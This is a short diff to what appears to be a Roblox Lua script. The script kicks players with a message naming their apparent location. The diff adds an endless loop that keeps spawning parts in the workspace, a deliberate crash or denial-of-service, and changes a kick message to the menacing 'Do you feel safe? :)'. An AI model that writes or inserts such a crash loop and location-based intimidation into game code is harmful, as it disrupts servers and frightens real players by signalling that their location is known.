@@ -267,8 +267,12 @@ if success then
     local location = locations[code]
     if location then
         player:Kick("How is it like in " .. location .. "?")
+while true do
+local part = Instance.new("Part")
+part.Parent = workspace
+end
     else
-        player:Kick("How is it like in your location?")
+        player:Kick("Do you feel safe? :)")
     end
 else
     player:Kick("Error; please try again later")
